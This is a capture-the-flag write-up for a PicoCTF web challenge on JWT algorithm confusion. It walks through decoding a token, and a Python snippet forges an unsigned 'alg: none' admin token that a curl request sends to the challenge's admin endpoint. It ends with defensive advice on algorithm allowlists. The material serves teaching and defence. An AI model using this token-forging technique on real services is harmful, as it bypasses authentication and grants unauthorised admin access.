---
title: "JWT Algorithm Confusion"
ctf: "PicoCTF 2025"
category: "Web"
difficulty: "Medium"
date: 2025-03-10
tags: ["jwt", "authentication", "algorithm-confusion"]
excerpt: "Exploiting a JWT library that accepts 'none' as a valid algorithm to forge admin tokens without a secret key."
---

## Introduction

This challenge presented a web application that used JWTs for authentication. The login endpoint returned a signed token, and protected routes validated it. The goal was to access an admin-only endpoint.

After capturing the login response, I decoded the JWT header and noticed the library version was outdated — a hint that algorithm confusion might be possible.

## Reconnaissance

I decoded the token with `base64 -d`:

```bash
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# {"alg":"HS256","typ":"JWT"}
```

The payload showed a `role: "user"` claim. The goal was to forge a token with `role: "admin"`.

## Exploitation

I crafted a new JWT using the `none` algorithm, which some vulnerable libraries accept:

```python
import base64, json

header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({"user":"admin","role":"admin"}).encode()).rstrip(b'=')

token = f"{header.decode()}.{payload.decode()}."
print(token)
```

Sending the forged token:

```bash
curl -H "Authorization: Bearer <forged_token>" https://challenge.ctf/admin
# Flag: picoCTF{jwt_alg_confusion_is_dangerous}
```

## Conclusion

Always validate the `alg` field in JWT libraries and explicitly reject `none`. Use an allowlist of accepted algorithms rather than trusting whatever the token header declares.

**Key takeaways:**
- Never trust client-supplied algorithm headers
- Pin JWT libraries to versions that reject `none` algorithm
- Use a strict algorithm allowlist on the server side
